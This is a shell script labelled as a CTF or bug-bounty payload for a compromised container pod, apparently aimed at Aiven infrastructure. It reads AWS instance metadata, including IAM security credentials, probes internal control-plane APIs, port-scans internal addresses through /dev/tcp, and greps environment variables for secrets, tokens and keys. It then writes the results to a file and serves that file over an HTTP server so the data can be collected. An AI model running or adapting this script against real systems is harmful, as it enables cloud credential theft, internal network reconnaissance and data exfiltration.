#!/bin/sh
# CTF falcon — RCE pod: Aiven control plane / IMDS / internal hosts / KMS
{
  echo "=== POD ==="; id 2>&1
  echo "--- iface ---"; cat /proc/net/fib_trie 2>/dev/null | grep -B1 "32 host" | grep -oE "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | sort -u
  echo "--- dns ---"; cat /etc/resolv.conf 2>/dev/null
  echo
  echo "=== AWS IMDS ==="
  curl -s --max-time 4 http://169.254.169.254/latest/meta-data/hostname 2>/dev/null; echo
  curl -s --max-time 4 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null; echo
  curl -s --max-time 4 http://169.254.169.254/latest/meta-data/local-ipv4 2>/dev/null; echo
  curl -s --max-time 4 http://169.254.169.254/latest/meta-data/placement/region 2>/dev/null; echo
  echo "-- IAM roles --"
  ROLES=$(curl -s --max-time 4 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null); echo "$ROLES"
  for r in $ROLES; do
    echo "role: $r"
    curl -s --max-time 4 http://169.254.169.254/latest/meta-data/iam/security-credentials/$r 2>/dev/null | head -c 400; echo
  done
  echo
  echo "=== Aiven internal hosts (DNS) ==="
  for h in api.aiven.io mcp.aiven.live console.aiven.io aiven-api control-plane internal-api registry-1.docker.io github.com; do
    ip=$(getent hosts $h 2>/dev/null | awk '{print $1}' | head -1)
    echo "$h -> $ip"
  done
  echo
  echo "=== Aiven internal API from pod (falcon avnadmin leak?) ==="
  # try Aiven internal control plane
  for base in http://api.aiven.io http://aiven-api:8080 http://control-plane:8080; do
    echo "-- $base --"
    curl -s --max-time 6 "$base/v1/project/dev-sandbox/service/falcon-bug-bounty-flag-pgsql" 2>/dev/null | head -c 300; echo
  done
  echo
  echo "=== internal 10.1.47.111 (falcon) all probe ==="
  for p in 80 443 5432 12691 21911 21912 9443 22; do
    timeout 3 sh -c "cat < /dev/null > /dev/tcp/10.1.47.111/$p" 2>/dev/null && echo "10.1.47.111:$p OPEN"
  done
  echo
  echo "=== scan 172.31.0.0/20 for Aiven control plane (sample) ==="
  for i in 1 5 10 20 30 32 33 34 35 36 37 38 39 40; do
    ip="172.31.$((i/256)).$((i%256))"
  done
  for ip in 172.31.0.1 172.31.0.2 172.31.0.3 172.31.0.4 172.31.0.5 172.31.0.10 172.31.0.20; do
    for p in 8080 3000 80 5432; do
      timeout 1 sh -c "cat < /dev/null > /dev/tcp/$ip/$p" 2>/dev/null && echo "$ip:$p OPEN"
    done
  done
  echo
  echo "=== env (Aiven secrets) ==="
  env | grep -iE "aiven|secret|db|postgres|pg_|kms|url|token|key" | grep -viE "path|shell|term" | head -30
  echo "=== END ==="
} > /app/ctf.txt 2>&1
exec python3 -m http.server 8080 --directory /app
